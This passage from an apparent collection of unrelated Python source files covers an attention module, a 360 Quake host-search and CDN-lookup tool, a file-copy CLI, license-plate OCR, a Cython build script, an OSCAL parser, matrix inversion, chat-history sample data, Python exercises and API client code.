self.qk_dim+self.dim], dim=-1)\r\n        return q, kv\r\n        # q, k, v = self.qkv(x).split([self.qk_dim, self.qk_dim, self.dim], dim=-1)\r\n        # return q, k, v\r\n\r\nclass BiLevelRoutingAttention(nn.Module):\r\n    \"\"\"\r\n    n_win: number of windows in one side (so the actual number of windows is n_win*n_win)\r\n    kv_per_win: for kv_downsample_mode='ada_xxxpool' only, number of key/values per window. Similar to n_win, the actual number is kv_per_win*kv_per_win.\r\n    topk: topk for window filtering\r\n    param_attention: 'qkvo'-linear for q,k,v and o, 'none': param free attention\r\n    param_routing: extra linear for routing\r\n    diff_routing: wether to set routing differentiable\r\n    soft_routing: wether to multiply soft routing weights \r\n    \"\"\"\r\n    def __init__(self, dim, n_win=7, num_heads=8, qk_dim=None, qk_scale=None,\r\n                 kv_per_win=4, kv_downsample_ratio=4, kv_downsample_kernel=None, kv_downsample_mode='identity',\r\n                 topk=4, param_attention=\"qkvo\", param_routing=False, diff_routing=False, soft_routing=False, side_dwconv=3,\r\n                 auto_pad=True):\r\n  ",
    "import argparse\r\nimport requests\r\nimport json\r\nimport pandas as pd\r\nimport os\r\nimport sqlite3\r\nfrom prettytable import PrettyTable\r\nimport dns.resolver\r\nfrom geopy.geocoders import Nominatim\r\n\r\n# \u5b9a\u4e49\u5e38\u91cf\u5217\u8868\uff0c\u5305\u542b\u5e38\u89c1\u7684CDN\u670d\u52a1\u5546\u540d\u79f0\r\nCOMMON_CDN_NAMES = [\"cloudflare\", \"akamai\", \"fastly\", \"maxcdn\", \"cloudfront\", \"azure cdn\", \"google cloud cdn\", \"stackpath\", \"limelight\", \"incapsula\"]  # \u6839\u636e\u9700\u8981\u6dfb\u52a0\u66f4\u591aCDN\u670d\u52a1\u5546\u540d\u79f0\r\n\r\nclass QuakeQuery:\r\n    def __init__(self, api_key):\r\n        self.api_key = api_key\r\n        self.conn = None\r\n        self.geolocator = Nominatim(user_agent=\"GUI_Enterprise_TI\")\r\n\r\n    def check_cdn_usage(self, hostname):\r\n        ipv4_addresses = []\r\n        resolver = dns.resolver.Resolver()\r\n        answers = resolver.resolve(hostname, 'A')\r\n\r\n        for answer in answers:\r\n            ipv4_addresses.append(answer.address)\r\n\r\n        return len(ipv4_addresses) >= 2\r\n\r\n    def connect_to_database(self, db_name=\"quake_results.db\"):\r\n        self.conn = sqlite3.connect(db_name)\r\n        self.cursor = self.conn.cursor()\r\n        self.create_table()\r\n\r\n    def create_table(self):\r\n        self.cursor.execute(\"\"\"\r\n            CREATE TABLE IF NOT EXISTS quake_results (\r\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n                hostname TEXT NOT NULL,\r\n                ip TEXT NOT NULL,\r\n                port INTEGER NOT NULL\r\n            )\r\n        \"\"\")\r\n        self.conn.commit()\r\n\r\n    def store_to_database(self, results):\r\n        insert_query = \"\"\"\r\n            INSERT INTO quake_results (hostname, ip, port) VALUES (?, ?, ?)\r\n        \"\"\"\r\n        rows_to_insert = [(item[\"service\"][\"http\"][\"host\"], item[\"ip\"], item[\"port\"]) for item in results]\r\n\r\n        self.cursor.executemany(insert_query, rows_to_insert)\r\n        self.conn.commit()\r\n\r\n    def perform_search(self, query, result_count, start_page):\r\n        headers = {\"X-QuakeToken\": self.api_key}\r\n        payload = {\r\n            \"query\": query,\r\n            \"start\": start_page,\r\n            \"size\": str(result_count),\r\n        }\r\n\r\n        try:\r\n            response = requests.post(\r\n                url=\"https://quake.360.cn/api/v3/search/quake_service\",\r\n                headers=headers,\r\n                json=payload,\r\n            )\r\n            response.raise_for_status()\r\n            return json.loads(response.text)\r\n        except requests.RequestException as e:\r\n            print(f\"API\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef: {e}\")\r\n            raise\r\n\r\n    def identify_cdn_provider(self, hostname):\r\n            url = f\"http://{hostname}\"\r\n            try:\r\n                response = requests.get(url, timeout=5)\r\n                response.raise_for_status()\r\n\r\n                server_header = response.headers.get(\"Server\", \"\").lower()\r\n                for cdn_name in COMMON_CDN_NAMES:\r\n                    if cdn_name.lower() in server_header:\r\n                        return cdn_name\r\n\r\n            except (requests.exceptions.RequestException, requests.exceptions.HTTPError):\r\n                pass\r\n            return None\r\n\r\n    def display_results(self, api_response, start_page, result_count, query_term):\r\n            print(\"\\n\")\r\n            print(f\"\u9875\u7801\uff1a\u7b2c{api_response['meta']['pagination']['page_index']}\u9875 \u5171\"\r\n                f\"{api_response['meta']['pagination']['page_size']}\u9875 \u603b\u6570\u91cf\uff1a\"\r\n                f\"{api_response['meta']['pagination']['total']}\u4e2a\")\r\n            print(f\"\u67e5\u8be2\u5185\u5bb9\uff1a{query_term}\")\r\n\r\n            table = PrettyTable([\"\u5e8f\u53f7\", \"\u5730\u5740\", \"IP\",  \"\u7aef\u53e3\",\"IP\u4f4d\u7f6e\", \"CDN\u670d\u52a1\u5546\"])\r\n\r\n            for index, item in enumerate(api_response[\"data\"], start=1):\r\n                if \"http\" in item[\"service\"]:\r\n                    hostname = item[\"service\"][\"http\"][\"host\"]\r\n\r\n                    if self.check_cdn_usage(hostname):\r\n                        cdn_provider = self.identify_cdn_provider(hostname)\r\n                    else:\r\n                        cdn_provider = \"\u672a\u77e5\"\r\n\r\n                    ip_address = item[\"ip\"]\r\n                    location = self.get_ip_location(ip_address)  # \u83b7\u53d6IP\u4f4d\u7f6e\u4fe1\u606f\r\n\r\n                    table.add_row([\r\n                        index,\r\n                        hostname,\r\n                        ip_address,\r\n                        item[\"port\"],\r\n                        location or \"\u672a\u77e5\",\r\n                        cdn_provider,\r\n                    ])\r\n                else:\r\n                    print(f\"\u8b66\u544a\uff1a\u7b2c{index}\u6761\u7ed3\u679c\u7684'service'\u7ed3\u6784\u4e2d\u7f3a\u5c11'http'\u5b50\u9879\uff0c\u8df3\u8fc7\u8be5\u6761\u8bb0\u5f55\u3002\")\r\n\r\n            print(table)\r\n\r\n    def get_ip_location(self, ip_address):\r\n        print(\"\u67e5\u8be2\u4e2d...\", end=\"\\r\")\r\n        location = self._get_ip_location_with_ip_api(ip_address)\r\n        if location is None:\r\n            location = self._get_ip_location_with_geopy(ip_address)\r\n        print(\" \" * 20, end=\"\\r\")  # \u6e05\u9664\u201c\u67e5\u8be2\u4e2d...\u201d\u5e76\u56de\u8f66\r\n        return location\r\n\r\n    def _get_ip_location_with_geopy(self, ip_address):\r\n        try:\r\n            location = self.geolocator.reverse(ip_address, language=\"zh-CN\")\r\n            return location.address\r\n        except Exception as e:\r\n            print(f\"\u4f7f\u7528geopy\u83b7\u53d6IP {ip_address} \u4f4d\u7f6e\u4fe1\u606f\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\r\n            ",
    "import os\nimport shutil\nfrom concurrent.futures import ThreadPoolExecutor\nfrom configparser import ConfigParser\nfrom datetime import datetime\nfrom pathlib import Path\n\nimport click\n\nDEFAULT_CFG = [\n    \"config.ini\",\n    Path.home() / \".sdcopy\",\n]\n\n\ndef file_times(src: Path) -> tuple[float, float]:\n    \"\"\"Get file timestamps\"\"\"\n    stat = src.stat()\n    return stat.st_atime, stat.st_mtime\n\n\ndef format_path(src: Path, fmt: str) -> str:\n    \"\"\"Format path pattern\"\"\"\n    mtime = datetime.fromtimestamp(src.stat().st_mtime)\n    return fmt.format(\n        year=mtime.year,\n        month=str(mtime.month).zfill(2),\n        day=str(mtime.day).zfill(2),\n    )\n\n\ndef copy_file(src: Path, dst: Path, dry_run: bool = False) -> None:\n    click.echo(f\"copying {src.name} -> {dst}\")\n    if not dry_run:\n        os.makedirs(dst.parent, exist_ok=True)\n        if not os.path.exists(dst):\n            shutil.copy(src, dst)\n            os.utime(dst, times=file_times(src))\n            click.echo(f\"{src.name} done.\")\n        else:\n            click.echo(f\"{src.name} already exists.\")\n    else:\n        click.echo(f\"{src.name} done.\")\n\n\n@click.command()\n@click.argument(\"source\", nargs=-1, type=click.Path(exists=True))\n@click.argument(\"dest\", nargs=1, type=click.Path())\n@click.option(\"-c\", \"--config\", type=click.Path(dir_okay=False))\n@click.option(\"-df\", \"--dest-format\", default=\"{year}-{month}-{day}\")\n@click.option(\"--dry-run\", is_flag=True)\n@click.option(\"--threads\", default=4)\ndef main(source, dest, config, dest_format, dry_run, threads) -> None:\n    dst_path = Path(dest)\n\n    cfg = ConfigParser()\n    if not config:\n        config = DEFAULT_CFG\n\n    config_exists = cfg.read(config)\n\n    if dry_run:\n        click.echo(\"Dry-run mode is ENABLED\")\n    else:\n        os.makedirs(dest, exist_ok=True)\n\n    with ThreadPoolExecutor(threads) as t:\n        if config_exists:\n            click.echo(f\"Config loaded: {config_exists}\")\n\n            for section in cfg.sections():\n                folder = cfg[section]\n                if \"path\" not in folder:\n                    continue\n\n                folder_format = folder.get(\"format\", dest_format)\n\n                for src_folder in source:\n                    src_path = Path(src_folder) / folder[\"path\"]\n                    click.echo(f\"== {section} [{src_path}] ==\")\n\n                    if not src_path.is_dir():\n                        click.echo(f\"{src_path} not found!\")\n                        continue\n\n                    for src_file in src_path.iterdir():\n                        if src_file.is_dir():\n                            continue\n\n                        dst_file = dst_path / format_path(src_file, folder_format) / src_file.name\n                        t.submit(copy_file, src_file, dst_file, dry_run)\n\n        else:\n            for src_folder in source:\n                src_path = Path(src_folder)\n                for src_file in src_path.iterdir():\n                    dst_file = dst_path / format_path(src_file, dest_format) / src_file.name\n                    t.submit(copy_file, src_file, dst_file, dry_run=dry_run)\n\n    if dry_run:\n        click.echo(\"Dry-run mode. NO CHANGES MADE\")\n\n    click.echo(\"Done\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import streamlit as st\nimport PIL\nimport cv2\nimport numpy as np\nimport imutils\nimport easyocr\nimport tempfile\n\n\n# Setting page layout\nst.set_page_config(\n    page_title=\"Automatic Number Plate License Detection\",  # Setting page title\n    page_icon=\"\ud83d\ude97\",     # Setting page icon\n    layout=\"wide\",      # Setting layout to wide\n    initial_sidebar_state=\"expanded\",    # Expanding sidebar by default   \n)\n\n# Creating sidebar\nwith st.sidebar:\n    st.header(\"Image Config\")     # Adding header to sidebar\n    # Adding file uploader to sidebar for selecting images\n    source_img = st.file_uploader(\n        \"Upload an image...\", type=(\"jpg\", \"jpeg\", \"png\", 'bmp', 'webp'))\n    \n\n# Creating main page heading\nst.title(\"Automatic Number Plate License Detection\")\nst.caption('Upload an image of a vehicle with a number plate.')\nst.caption('Then click the :blue[Detect License Plate] button and check the result.')\n# Creating two columns on the main page\ncol1, col2 = st.columns(2)\n\n\n# Adding image to the first column if image is uploaded\nwith col1:\n    if source_img:\n        # Opening the uploaded image\n        uploaded_image = PIL.Image.open(source_img)\n        print(uploaded_image)\n        # Adding the uploaded image to the page with a caption\n        st.image(source_img,\n                 caption=\"Uploaded Image\",\n                 use_column_width=True\n                 )\n        \n\nif st.sidebar.button('Detect License Plate'):\n    # Save the uploaded image to a temporary file and read it\n    tfile = tempfile.NamedTemporaryFile(delete=True)\n    tfile.write(source_img.read())\n\n    # Read image\n    img = cv2.imread(tfile.name)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n\n    # Apply filter and find edges for localization\n    bfilter = cv2.bilateralFilter(gray, 11, 17, 17) #Noise reduction\n    edged = cv2.Canny(bfilter, 30, 200) #Edge detection\n\n    # Find contours and apply mask\n    keypoints = cv2.findContours(edged.copy(), cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n    contours = imutils.grab_contours(keypoints)\n    contours = sorted(contours, key=cv2.contourArea, reverse=True)[:10]\n\n    location = None\n    for contour in contours:\n        approx = cv2.approxPolyDP(contour, 10, True)\n        if len(approx) == 4:\n            location = approx\n            break\n\n    mask = np.zeros(gray.shape, np.uint8)\n    new_image = cv2.drawContours(mask, [location], 0,255, -1)\n    new_image = cv2.bitwise_and(img, img, mask=mask)\n\n\n    # Crop license plate\n    (x,y) = np.where(mask==255)\n    (topx, topy) = (np.min(x), np.min(y))\n    (bottomx, bottomy) = (np.max(x), np.max(y))\n    cropped_image = gray[topx:bottomx+1, topy:bottomy+1]\n\n\n    # Use Easy OCR to read text\n    reader = easyocr.Reader(['en'])\n    result = reader.readtext(cropped_image)\n\n    with col2:\n        try:\n            text = result[0][-2]\n        except Exception as e:\n            text = \"No Text Detected\"\n        font = cv2.FONT_HERSHEY_SIMPLEX\n        res = cv2.putText(img, text=text, org=(approx[0][0][0], approx[1][0][1]+60), fontFace=font, fontScale=1, color=(0,255,0), thickness=2, lineType=cv2.LINE_AA)\n        res = cv2.rectangle(img, tuple(approx[0][0]), tuple(approx[2][0]), (0,255,0),3)\n        st.image(cv2.cvtColor(res, cv2.COLOR_BGR2RGB), caption=\"Detected License Plate\", use_column_width=True)\n\n        try:\n            st.write(\"Detected License Plate:\", text)\n        except Exception as e:\n            st.write(\"No License Plate Detected\")",
    "import os, pathlib, shutil\nimport sys, platform\nfrom setuptools import Extension, setup\n\nSOURCE_DIR = \"path/to/folder\"\nsource_files = []\n\nfor root, dirs, files in os.walk(SOURCE_DIR):\n    for file in files:\n        if (not file.endswith((\".py\", \".pyx\"))) or file.startswith(\"__init__\"):\n            continue\n        name = file[: file.rindex(\".\")]\n        source_files.append((name, os.path.join(root, file)))\n\nsys.argv[1:] = [\"build_ext\", \"--inplace\"]\next_modules = [Extension(name, [source]) for name, source in source_files]\nsetup(ext_modules=ext_modules)\n\nbase_dir = os.path.dirname(os.path.abspath(sys.argv[0]))\nbuild_dir = os.path.join(base_dir, \"build\")\nshutil.rmtree(build_dir, ignore_errors=True)\n\nextension = \".pyd\" if platform.system().lower() == \"windows\" else \".so\"\ndynamic_libraries = [\n    file\n    for file in os.listdir(base_dir)\n    if (os.path.isfile(file) and file.endswith(extension))\n]\n\nfor name, source in source_files:\n    c_file = source[: source.rindex(\".\")] + \".c\"\n    pathlib.Path(c_file).unlink(missing_ok=True)\n\n    for library in dynamic_libraries:\n        if not library.startswith(name):\n            continue\n        move_from = os.path.join(base_dir, library)\n        move_to = os.path.join(os.path.dirname(source), library)\n        pathlib.Path(move_to).unlink(missing_ok=True)\n        shutil.move(move_from, move_to)\n        break\n",
    "from lxml import etree\n\nclass OSCALCatalogParser:\n    def __init__(self):\n        pass  # Assuming schema validation is handled separately or not required for parsing\n\n    def parse(self, xml_data_path):\n        ns = {'oscal': 'http://csrc.nist.gov/ns/oscal/1.0'}\n        \n        try:\n            tree = etree.parse(xml_data_path)\n            root = tree.getroot()\n\n            catalog_id = root.attrib['uuid']\n            title = root.find('oscal:metadata/oscal:title', ns).text\n            \n            controls = root.findall('.//oscal:control', ns)\n            control_details = []\n            for control in controls:\n                control_id = control.get('id')\n                control_title = control.find('oscal:title', ns).text if control.find('oscal:title', ns) is not None else \"No Title\"\n                \n                # Assuming statements are contained within 'oscal:part' elements with a 'name' attribute of 'statement'\n                statements = control.findall(\"oscal:part[@name='statement']\", ns)\n                statement_texts = []\n                for statement in statements:\n                    # Each 'oscal:part' may contain multiple 'oscal:part' elements representing different statement items\n                    parts = statement.findall(\"oscal:part\", ns)\n                    for part in parts:\n                        if part.text:\n                            statement_texts.append(part.text.strip())\n                \n                control_details.append({\n                    'id': control_id,\n                    'title': control_title,\n                    'statements': statement_texts\n                })\n\n            return {\n                'catalog_id': catalog_id,\n                'title': title,\n                'controls': control_details\n            }\n        except Exception as e:\n            print(f\"Unexpected error: {e}\")\n            return None\n",
    "\"\"\"\nPython code related to the numerical linear algebra lesson project -> Inverse matrix using Gauss\n\nwriter : Matin Mohammadi \n\nProfessor's name: Dr. Tabrizi Doz\n\"\"\" \nimport numpy as np\n\n# n = int(input(\"len : \"))\n\n# a_matrix = np.zeros((n, 2*n))\n\n# for i in range(n):\n#     for j in range(n):\n#         a_matrix[i][j] = float(input(f\"a[{str(i+1)},{str(j+1)}] : \"))\n\n# # attached the I matrix \n# for i in range(n):\n#     for j in range(n):\n#         if i == j :\n#             a_matrix[i][j+n] = 1\n\n# #print(a_matrix)\n# \"\"\"\n# [[ 1. -1.  1.  1.  0.  0.]\n#  [ 2.  1.  2.  0.  1.  0.]\n#  [ 3.  2. -1.  0.  0.  1.]]\n# \"\"\"\n# # ---------------------------------------------\n# # Elimination process\n# for i in range(n):\n#     if a_matrix[i][j] == 0.0:\n#         raise Exception(\"Divide by zero Error , please check the values or pivoting\")\n#     for j in range(n):\n#         if i != j :\n#             factor = a_matrix[j][i] / a_matrix[i][i]\n#             for f in range(2*n):\n#                 a_matrix[j][f] -=  factor*a_matrix[i][f]\n\n# for i in range(n):\n#     divs = a_matrix[i][i]\n#     for j in range(2*n):\n#         a_matrix[i][j] /= divs\n\n# # show matrix\n# print(a_matrix)\n\n\"\"\"\nlen : 3\na[1,1] : 2\na[1,2] : -2\na[1,3] : 3\na[2,1] : 1\na[2,2] : 1\na[2,3] : 1\na[3,1] : 1\na[3,2] : 3\na[3,3] : -1\n[[ 1.          0.          0.          0.66666667 -1.16666667  0.83333333]\n [ 0.          1.          0.         -0.33333333  0.83333333 -0.16666667]\n [-0.         -0.          1.         -0.33333333  1.33333333 -0.66666667]]\n\"\"\"\n\n# lets write in OOP form :\nclass MatrixInverter:\n    def __init__(self, size):\n        self.size = size\n        self.a_matrix = np.zeros((self.size, 2*self.size))\n\n    def input_matrix(self):\n        for i in range(self.size):\n            for j in range(self.size):\n                self.a_matrix[i][j] = float(input(f\"a[{i+1},{j+1}]: \"))\n\n    def attach_identity(self):\n        \"\"\"\n        to attach the main matrix with I matrix for make augmented matrix:\n        [[a11 a12  a13   1   0.   0.]\n        [ a21  a22  a23  0.  1.  0.]\n        [ a31 a32 a33    0.  0.  1.]]\n        \"\"\"\n        for i in range(self.size):\n            self.a_matrix[i][i+self.size] = 1\n\n    def eliminate(self):\n        for i in range(self.size):\n            if self.a_matrix[i][i] == 0.0:\n                raise Exception(\"Divide by zero detected, please check the values or consider pivoting\")\n            for j in range(self.size):\n                if i != j:\n                    factor = self.a_matrix[j][i] / self.a_matrix[i][i]\n                    for f in range(2*self.size):\n                        self.a_matrix[j][f] -= factor * self.a_matrix[i][f]\n\n    def normalize(self):\n        \"\"\"\n        responsible for transforming the rows of the augmented matrix (which contains both the original matrix and the identity matrix) \n        into a form where the leading coefficient of each row (the diagonal elements of the original matrix part) is 1.\n        This is achieved by dividing each element in a row by the value of the leading coefficient (the diagonal element) of that row.\n        \"\"\"\n        for i in range(self.size):\n            divisor = self.a_matrix[i][i]\n            for j in range(2*self.size):\n                self.a_matrix[i][j] /= divisor\n\n    def invert(self):\n        self.input_matrix()\n        self.attach_identity()\n        self.eliminate()\n        self.normalize()\n        return self.a_matrix[:, self.size:]\n\n# usage:\nn = int(input(\"Enter the size of the matrix: \"))\ninverter = MatrixInverter(n)\ninverse_matrix = inverter.invert()\nprint(\"The inverse matrix is:\")\nprint(inverse_matrix)",
    "CLUSTER_ENDPOINT = \"https://{url}:443\"\nTOKEN = \"{user_name}:{password}\"  # Set your token\nCOLLECTION_NAME = \"chat_history\"  # Set your collection name\ndialogs = [\n    {\n        \"id\": 0,\n        \"role\": \"user\",\n        \"content\": \"\u4ec0\u4e48\u662fRESTful API\uff1f\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 1,\n    },\n    {\n        \"id\": 1,\n        \"role\": \"assistant\",\n        \"content\": \"RESTful API\u662f\u4e00\u79cd\u57fa\u4e8eREST\u67b6\u6784\u98ce\u683c\u8bbe\u8ba1\u7684\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\uff0c\u901a\u8fc7HTTP\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u4f7f\u7528GET\u3001POST\u3001PUT\u3001DELETE\u7b49\u65b9\u6cd5\u6765\u5b9e\u73b0\u8d44\u6e90\u7684\u589e\u5220\u6539\u67e5\u64cd\u4f5c\u3002\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 2,\n    },\n    {\n        \"id\": 2,\n        \"role\": \"user\",\n        \"content\": \"\u524d\u7aef\u6846\u67b6Vue.js\u548cReact\u6709\u4ec0\u4e48\u533a\u522b\uff1f\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 2,\n    },\n    {\n        \"id\": 3,\n        \"role\": \"assistant\",\n        \"content\": \"Vue.js\u548cReact\u90fd\u662f\u6d41\u884c\u7684\u524d\u7aef\u6846\u67b6\uff0cVue.js\u66f4\u6ce8\u91cd\u7b80\u5355\u6027\u548c\u6613\u7528\u6027\uff0c\u800cReact\u66f4\u6ce8\u91cd\u7075\u6d3b\u6027\u548c\u6027\u80fd\u3002Vue.js\u63d0\u4f9b\u4e86\u66f4\u591a\u7684\u5185\u7f6e\u529f\u80fd\uff0c\u800cReact\u66f4\u6ce8\u91cd\u7ec4\u4ef6\u5316\u548c\u865a\u62dfDOM\u3002\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 2,\n    },\n    {\n        \"id\": 4,\n        \"role\": \"user\",\n        \"content\": \"\u4ec0\u4e48\u662fMVC\u67b6\u6784\uff1f\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 1,\n    },\n    {\n        \"id\": 5,\n        \"role\": \"assistant\",\n        \"content\": \"MVC\u67b6\u6784\u662f\u4e00\u79cd\u8f6f\u4ef6\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u5c06\u5e94\u7528\u7a0b\u5e8f\u5206\u4e3a\u6a21\u578b\uff08Model\uff09\u3001\u89c6\u56fe\uff08View\uff09\u548c\u63a7\u5236\u5668\uff08Controller\uff09\u4e09\u4e2a\u90e8\u5206\uff0c\u4ee5\u5b9e\u73b0\u4ee3\u7801\u7684\u5206\u79bb\u548c\u7ba1\u7406\uff0c\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u7ef4\u62a4\u6027\u548c\u53ef\u6269\u5c55\u6027\u3002\",\n        \"session_id\": \"121822331\",\n        \"user_id\": 2,\n    },\n]\n",
    "import torch\nimport numpy as np\nimport math\nfrom scipy.stats import ortho_group\nimport torch.nn.functional as F\n\n\n### generate random vectors for input data from gaussian distribution\ndef generate_random_vec(num, dim, mean = None, std = None):\n    if mean is None:\n        mean = torch.zeros(dim)\n    if std is None:\n        std = torch.ones(dim)\n    return (torch.randn(num, dim) * std + mean).float()\n\n# generate random vectors follow https://arxiv.org/abs/1711.05174 \ndef generate_random_vec_zeyuan(num, dim):\n    # generate num*dim orthonormal matrix U\n    p = dim//2\n    n2 = num // 2\n    \n    U1 = ortho_group.rvs(n2)[:, :p]\n    V1 = ortho_group.rvs(p)\n    S1 = np.diag(np.array([1.0 / (i + 1) for i in range(p)]))\n    X1 = U1 @ S1 @ V1\n    \n    U2 = ortho_group.rvs(n2)[:, :p]\n    V2 = ortho_group.rvs(p)\n    S2 = np.diag(np.array([2.0 / (i + 10) for i in range(p)]))\n    X2 = U2 @ S2 @ V2\n    \n    ### X = [X1 0; 0 X2] block matrix\n    X = np.zeros((num, dim))\n    X[:n2, :p] = X1\n    X[n2:, p:] = X2\n    \n    return torch.tensor(X)\n\n### generate sparse random matrix\ndef sparse_random_matrix(dim1, dim2, sparsity_ratio = 0.01):\n    with torch.no_grad():\n        A = torch.randn(dim1, dim2)\n        A = F.dropout(A, p = 1 - sparsity_ratio)\n        \n    return A\n\n\n# modified from https://arxiv.org/abs/1711.05174, randn can generate almost orthogonal matrix when dim is large\ndef generate_random_vec_fast_zeyuan(num, dim):\n    # generate num*dim orthonormal matrix U\n    p = dim//2\n    n2 = num // 2\n    \n    U1 = torch.randn(n2, p)\n    V1 = torch.randn(p, p)\n    S1 = torch.diag(torch.tensor([1.0 / (i + 1) for i in range(p)]))\n    X1 = U1 @ S1 @ V1\n    \n    U2 = torch.randn(n2, p)\n    V2 = torch.randn(p, p)\n    S2 = torch.diag(torch.tensor([1.0 / (i + 1) for i in range(p)]))\n    X2 = U2 @ S2 @ V2\n    \n    ### X = [X1 0; 0 X2] block matrix\n    X = np.zeros((num, dim))\n    X[:n2, :p] = X1\n    X[n2:, p:] = X2\n    \n    return torch.tensor(X)\n",
    "#==================== List =========================================\n\n'''  \nHow do you iterate over elements in a list using loops in Python?\n'''\nlist=[1,3,5,9,2,4,5,4]\n\nfor i in list:\n    print(i)\n\n''' \n How do you sort a list in Python? Explain different sorting techniques available?\n'''\nlist=[1,3,5,9,2,4,5,4]\n\nlist.sort()\nprint(list)\n\n#============ list to tuple ====================\nl1=[1,5,4,8,5,4,4,5,4]\nl2=tuple(l1)\nprint(l2)\n\n'''\nCan you explain the difference between list.sort() and sorted() functions?\n\n\nsort():method is a built-in method for lists in Python that sorts the elements of a list in place. It modifies the original list and doesn't return anything\nsorted(): function takes a list and returns a new sorted list, leaving the original list unchanged\n'''\n'''\nHow do you find the length of a list in Python\n'''\nl1=[1,2,5,4,9,1,5,4,8,54]\nprint(len(l1))\n\n#==================================== Tuple =================================================\n'''\nHow do you create an empty tuple in Python\n'''\nl1=()\n\nprint(len(l1))\n\n'''\nCan you modify the elements of a tuple after it has been created? Why or why not?\n\nNo, we can't modified the tuple because the tuples are immutable \n'''\n\n'''\n Explain the concept of indexing in tuples. How do you access elements in a tuple using indexing?\n'''\nl1=(1,2,5,1,2,4,'a','k','d')\n\nprint(l1[5])\nprint(l1[8])\n\n'''\nHow do you convert a tuple into a list, and vice versa?\n'''\n\n\n#======================= Dictionary ==========================================\n'''\ndictionary-How do you create an empty dictionary in Python?\n'''\nl1={}\n\nprint(len(l1))\n\n'''\nExplain the difference between dict.keys() , dict.values() , and dict.items() methods.\n'''\n\nl1={\"name\":\"mohsin\",\"age\":30,\"address\":\"narol\"}\n#====keys===========================================================\nprint(l1)\nprint(l1.keys())\n#=======values======================================================\nprint(l1.values())\n#=======items=======================================================\nprint(l1.items())\n\n'''\nHow do you iterate over key-value pairs in a dictionary using loops in Python?\n'''\nfor key , values in l1.items():\n    print(l1)\n    break\n'''\nWhat are dictionary comprehensions? Provide an example\n'''\n#dict={ key:experssion for in iterable}\nd1={\"gujrata\":\"ahmedabad\",\"kerela\":\"kochi\",\"goa\":\"bagha beach\",\"maharastra\":\"mumbai\"}\n\nd2={key:values for (key,values) in d1.items() }\nprint(d2)\n\n# dict (if condtion) dict1={key: (condtion if/els) for (key,value) in dict }\n\nl1={\"kerela\":60,\"goa\":55,\"chennai\":71,\"gujarat\":88,\"maharastra\":64}\nl2={key: (\"hot\" if values>=60 else \"cold\") for (key,values) in l1.items()  }\nprint(l2)\n\n# dict function dict1={key : funct for i in iterable}\ndef temp(values):\n    if values < 80:\n        return(\"hot\")\n    elif values>= 60 and values<=79:\n        return(\"warm\")\n    else:\n        return(\"cold\")\nl1={\"kerela\":60,\"goa\":55,\"chennai\":71,\"gujarat\":88,\"maharastra\":64}\nl2={key:temp(values) for (key,values) in l1.items()}\nprint(l2)\n#========================= Set ========================================\n\n'''\nHow do you add elements to a set in Python?\n'''\nl1={'cat','dog','ant','elephant'}\nl1.add(\"nine\")\nprint(l1)\n\n'''\nExplain the difference between set.add() and set.update() methods.\n'''\n#==========.add() =========\n\nl1.add(\"pq\")\nprint(l1)\n\n#========== .update() ============\nl1.update(\"rabit\")\nprint(l1)\n\n'''\nWhat are set comprehensions? Provide an example.\n'''\nl1={'cat','dog','ant','elephant'}\nl2={i for i in l1}\nprint(l2)\n",
    "from typing import List\nfrom src.intent_handling.tool_strategy import Tool\nimport os\nimport requests\nfrom dotenv import load_dotenv\nload_dotenv('src/.env')\n\n# this is a concrete strategy that implements the abstract one, so that we can have multiple\nclass CsDetectorTool(Tool):    \n    last_repo = \"\"\n    def execute_tool(self, data:List):\n        print(\"\\n\\n\\nSono in execute tool\",data)\n        print(\"\\n\\n\\n\")\n        #if we have 2 entities (repo and date), we execute the tool with date parameter\n        if data.__len__() > 2:\n            req = requests.get(os.environ.get('CSDETECTOR_URL_GETSMELLS')+'?repo='+data[0]+'&pat='+os.environ.get('PAT',\"\")+\"&date=\"+data[1])\n        else:\n            req = requests.get(os.environ.get('CSDETECTOR_URL_GETSMELLS')+'?repo='+data[0]+'&pat='+os.environ.get('PAT',\"\")) #+'&user='+data[data.__len__()-1]+\"&graphs=True\"\n        \n        #req.raise_for_status()\n        response_json = req.json()\n\n        if req.status_code == 890:\n            error_text = response_json.get('error')\n            code = response_json.get('code')\n            results = [error_text, code]\n            print(\"\\n\\nRESULTATO\\n\\n\", results)\n            return results\n\n        print(\"\\n\\n\\nStampa risposta\",req.json())\n        print(\"\\n\\n\\n\")\n        # we retrieve the file names created by csdetector\n        results = req.json().get(\"result\")[1:]\n        return results\n",
    "import os\nimport logging\nimport json\nimport spotipy\nfrom spotipy.oauth2 import SpotifyClientCredentials\nimport azure.functions as func\nfrom azure.storage.filedatalake import DataLakeServiceClient\nfrom azure.storage.blob import BlobServiceClient\nfrom datetime import datetime\nfrom io import StringIO\nimport pandas as pd\n\napp = func.FunctionApp()\n\n# Retrieve environment variables\nspotify_client_id = os.environ.get(\"SPOTIFY_CLIENT_ID\")\nspotify_client_secret = os.environ.get(\"SPOTIFY_CLIENT_SECRET\")\nstorage_account_name = os.environ.get(\"STORAGE_ACCOUNT_NAME\")\nstorage_account_key = os.environ.get(\"STORAGE_ACCOUNT_KEY\")\nstorage_connection_string = os.environ.get(\"STORAGE_CONNECTION_STRING\")\nstorage_container = os.environ.get(\"STORAGE_CONTAINER\")\n\n\n@app.timer_trigger(\n    arg_name=\"myTimer\",\n    schedule=\"0 * * * *\"\n)\ndef spotify_data_extract(myTimer: func.TimerRequest) -> None:\n    \"\"\"Extracts data from the Spotify API and stores it in Azure Data Lake Storage Gen2.\n\n    Args:\n        myTimer (func.TimerRequest): The timer trigger object.\n\n    Returns:\n        None\n    \"\"\"\n    try:\n        # Initialize Spotify client\n        credentials = SpotifyClientCredentials(client_id=spotify_client_id, client_secret=spotify_client_secret)\n        spotify = 